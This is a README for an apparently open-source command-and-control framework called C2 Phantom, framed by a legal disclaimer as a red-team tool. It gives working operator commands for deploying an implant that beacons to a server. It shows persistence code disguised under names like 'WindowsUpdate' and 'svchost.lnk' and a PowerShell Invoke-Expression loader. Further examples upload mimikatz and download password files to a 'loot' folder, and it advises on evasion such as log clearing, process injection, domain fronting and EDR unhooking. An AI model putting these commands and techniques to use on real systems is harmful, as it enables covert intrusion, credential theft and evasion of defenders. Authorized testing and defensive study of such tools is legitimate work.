# C2 Phantom - Professional Command & Control Framework

## ⚠️ LEGAL DISCLAIMER

**This tool is for AUTHORIZED SECURITY TESTING ONLY.**

- Only use on systems you own or have EXPLICIT WRITTEN PERMISSION to test
- Unauthorized access to computer systems is ILLEGAL
- Users are responsible for compliance with all applicable laws
- Misuse may result in criminal prosecution

## Overview

C2 Phantom is a professional-grade Command & Control (C2) framework designed for red team operations, penetration testing, and security research. Built with Python, it provides a robust, encrypted, and extensible platform for post-exploitation activities.

### Key Features

✅ **Real Command Execution** - Subprocess-based shell command execution  
✅ **File Operations** - Binary-safe file upload/download with base64 encoding  
✅ **Encrypted Communications** - AES-256-GCM encryption for all C2 traffic  
✅ **Multiple Persistence** - Registry, Scheduled Tasks, WMI, Systemd  
✅ **Session Management** - Track multiple compromised systems  
✅ **Beautiful CLI** - Rich terminal UI with colors and progress bars  
✅ **RESTful Architecture** - HTTP-based C2 server with JSON API  
✅ **Cross-Platform** - Windows, Linux, macOS support  

## Architecture

```
┌──────────────────┐
│   Operator CLI   │  <- You are here (phantom commands)
│  (C2 Client)     │
└────────┬─────────┘
         │ HTTP REST API
         │ (Encrypted)
┌────────▼─────────┐
│    C2 Server     │  <- Central command server
│  (port 8443)     │     - Queue commands
└────────┬─────────┘     - Store results
         │               - Manage sessions
         │ HTTP Beacon
         │ (Encrypted)
┌────────▼─────────┐
│   Agent/Implant  │  <- Runs on target system
│   (Target Host)  │     - Execute commands
└──────────────────┘     - Transfer files
                         - Maintain persistence
```

## Installation

### Prerequisites

- Python 3.9+
- Virtual environment (recommended)
- Administrative/root privileges (for some persistence methods)

### Setup

```powershell
# Clone repository
git clone https://github.com/4fqr/c2-phantom.git
cd c2-phantom

# Create virtual environment
python -m venv .venv

# Activate (Windows)
.venv\Scripts\activate

# Activate (Linux/Mac)
source .venv/bin/activate

# Install
pip install -e .

# Initialize
phantom init
```

## Quick Start

### 1. Start C2 Server

```powershell
# Terminal 1 - C2 Server
phantom server --host 0.0.0.0 --port 8443
```

Server starts and listens for agent connections. Keep this running.

### 2. Deploy Agent

```powershell
# Terminal 2 - Agent (on target machine or testing)
python -m c2_phantom.agent --server http://YOUR_SERVER:8443

# With custom beacon settings
python -m c2_phantom.agent --server http://YOUR_SERVER:8443 --beacon 30 --jitter 10
```

Agent registers with server and begins beaconing.

### 3. Operator Commands

```powershell
# Terminal 3 - Operator Console

# List active sessions
phantom list --status active

# Execute command
phantom execute "whoami" --session <SESSION_ID> --output

# Upload file
phantom upload local.txt C:\Windows\Temp\file.txt --session <SESSION_ID>

# Download file
phantom download C:\Windows\System32\drivers\etc\hosts ./hosts.txt --session <SESSION_ID>
```

## Command Reference

### Server Commands

```bash
phantom server [OPTIONS]

Options:
  --host TEXT      Bind address (default: 0.0.0.0)
  --port INTEGER   Bind port (default: 8443)
  --encrypt        Enable AES-256-GCM encryption
```

### Session Management

```bash
phantom list [OPTIONS]

Options:
  --status [active|inactive|all]  Filter by status
  --format [table|json|yaml]      Output format
  --verbose                       Show detailed info
```

### Command Execution

```bash
phantom execute COMMAND [OPTIONS]

Arguments:
  COMMAND           Command to execute

Options:
  --session TEXT    Target session ID (required)
  --server TEXT     C2 server URL (default: http://localhost:8443)
  --timeout INT     Timeout in seconds (default: 30)
  --output          Show command output
```

**Examples:**

```powershell
# Windows commands
phantom execute "ipconfig /all" --session abc123 --output
phantom execute "Get-Process | Select-Object -First 10" --session abc123 --output
phantom execute "systeminfo" --session abc123 --output

# Linux commands
phantom execute "ps aux" --session def456 --output
phantom execute "netstat -tulpn" --session def456 --output
```

### File Upload

```bash
phantom upload LOCAL_PATH REMOTE_PATH [OPTIONS]

Arguments:
  LOCAL_PATH      Local file to upload
  REMOTE_PATH     Destination path on target

Options:
  --session TEXT  Target session ID (required)
  --server TEXT   C2 server URL
  --timeout INT   Upload timeout (default: 60)
```

**Examples:**

```powershell
# Upload tools
phantom upload tools/mimikatz.exe C:\Windows\Temp\m.exe --session abc123

# Upload scripts
phantom upload scripts/enum.ps1 C:\Users\Public\enum.ps1 --session abc123
```

### File Download

```bash
phantom download REMOTE_PATH LOCAL_PATH [OPTIONS]

Arguments:
  REMOTE_PATH     File path on target
  LOCAL_PATH      Local destination

Options:
  --session TEXT  Target session ID (required)
  --server TEXT   C2 server URL
  --timeout INT   Download timeout (default: 60)
```

**Examples:**

```powershell
# Download credentials
phantom download C:\Users\Admin\Desktop\passwords.txt ./loot/pass.txt --session abc123

# Download logs
phantom download /var/log/auth.log ./loot/auth.log --session def456
```

## Agent Deployment

### Standalone Python

```powershell
# Basic deployment
python -m c2_phantom.agent --server http://10.0.0.100:8443

# Custom beacon interval
python -m c2_phantom.agent --server http://10.0.0.100:8443 --beacon 60 --jitter 30
```

### Compiled Binary

```powershell
# Using PyInstaller
pip install pyinstaller
pyinstaller --onefile --noconsole c2_phantom/agent.py

# Deploy binary
dist/agent.exe --server http://10.0.0.100:8443
```

### PowerShell Loader

```powershell
# Base64 encode agent
$agent = [System.IO.File]::ReadAllBytes("c2_phantom/agent.py")
$b64 = [Convert]::ToBase64String($agent)

# Load and execute
$decoded = [System.Convert]::FromBase64String($b64)
$text = [System.Text.Encoding]::UTF8.GetString($decoded)
Invoke-Expression $text
```

## Persistence

The agent includes built-in persistence mechanisms:

### Windows

1. **Registry Run Keys**
   ```python
   from c2_phantom.core.persistence import PersistenceManager
   pm = PersistenceManager(agent_path="C:\\Windows\\agent.exe")
   pm.install_registry_run(name="WindowsUpdate")
   ```

2. **Scheduled Tasks**
   ```python
   pm.install_scheduled_task(name="SystemMonitor")
   ```

3. **Startup Folder**
   ```python
   pm.install_startup_folder(name="svchost.lnk")
   ```

4. **WMI Event Subscriptions**
   ```python
   pm.install_wmi_event(name="SystemEvent")
   ```

### Linux

1. **Systemd User Services**
   ```python
   pm.install_linux_systemd(name="system-monitor")
   ```

2. **Cron Jobs** (Manual)
   ```bash
   @reboot /path/to/agent --server http://c2server:8443
   ```

## Encryption

All communications can be encrypted with AES-256-GCM:

```python
from c2_phantom.network.secure_channel import SecureChannel

# On server
channel = SecureChannel(password="YourSecurePassword123")

# On agent
channel = SecureChannel(password="YourSecurePassword123")

# Encrypt data
encrypted = channel.encrypt({"command": "whoami"})

# Decrypt data
decrypted = channel.decrypt(encrypted)
```

**Enable encryption in server:**

```powershell
phantom server --encrypt --password "YourSecurePassword123"
```

## Operational Security

### Best Practices

1. **Use HTTPS** - Always use TLS/SSL in production
2. **Strong Passwords** - Use 20+ character passwords for encryption
3. **Rotate Keys** - Change encryption keys regularly
4. **Clean Logs** - Clear command history and logs after operations
5. **Obfuscate** - Rename binaries and processes
6. **Test First** - Always test in lab environment before deployment

### Detection Evasion

- Use domain fronting (`--domain-front`)
- Randomize beacon intervals (`--jitter`)
- Obfuscate traffic with encryption
- Use proxy chains for anonymity
- Employ process injection techniques

## Troubleshooting

### Agent Not Connecting

**Check:**
- Is C2 server running? (`phantom server`)
- Firewall blocking port 8443?
- Correct server URL in agent command?
- Network connectivity between agent and server?

**Solution:**
```powershell
# Test connectivity
curl http://YOUR_SERVER:8443/health

# Check server logs
# Check agent output for errors
```

### Command Timeout

**Check:**
- Is agent still beaconing?
- Command taking longer than timeout?
- Agent process crashed?

**Solution:**
```powershell
# Increase timeout
phantom execute "long-command" --session abc123 --timeout 120

# Check agent is still alive
phantom list --status active
```

### File Upload/Download Fails

**Check:**
- File size (large files need higher timeout)
- Disk space on target
- Permissions to read/write file
- Path exists on target

**Solution:**
```powershell
# Increase timeout for large files
phantom upload big.zip C:\Temp\big.zip --session abc123 --timeout 300
```

## Development

### Project Structure

```
c2-phantom/
├── c2_phantom/
│   ├── agent.py              # Agent/implant implementation
│   ├── cli.py                # Operator CLI
│   ├── core/
│   │   ├── config.py         # Configuration management
│   │   ├── session.py        # Session tracking
│   │   ├── persistence.py    # Persistence mechanisms
│   │   └── exceptions.py     # Custom exceptions
│   ├── network/
│   │   ├── server.py         # C2 server (aiohttp)
│   │   ├── client.py         # C2 client (CLI)
│   │   ├── http.py           # HTTP channel
│   │   ├── secure_channel.py # Encryption layer
│   │   └── proxy.py          # Proxy chaining
│   ├── crypto/
│   │   ├── encryption.py     # AES/RSA/ECC
│   │   └── keys.py           # Key management
│   ├── evasion/
│   │   ├── obfuscation.py    # Code obfuscation
│   │   └── timing.py         # Timing jitter
│   └── utils/
│       └── ui.py             # Terminal UI helpers
├── tests/                    # Unit tests
├── docs/                     # Documentation
└── setup.py                  # Package setup
```

### Contributing

1. Fork the repository
2. Create feature branch (`git checkout -b feature/new-capability`)
3. Commit changes (`git commit -m 'Add new capability'`)
4. Push to branch (`git push origin feature/new-capability`)
5. Open Pull Request

## Security Considerations

### Detection Vectors

- **Network Traffic** - HTTP beacons can be detected by IDS/IPS
- **Process Monitoring** - Unusual Python processes may trigger EDR
- **File System** - Persistence artifacts can be found
- **Memory** - Process injection detectable by memory scanners

### Mitigation Strategies

1. Use encryption for all traffic
2. Implement process hollowing/injection
3. Use DLL sideloading for persistence
4. Employ API unhooking for EDR evasion
5. Randomize timing and behavior

## License

This project is provided for **educational and authorized security testing purposes only**. 

## Credits

Developed by the C2 Phantom team for professional security operations.

## Support

- GitHub Issues: https://github.com/4fqr/c2-phantom/issues
- Documentation: https://github.com/4fqr/c2-phantom/wiki
- Security: Report vulnerabilities privately

---

**Remember: With great power comes great responsibility. Use ethically.**
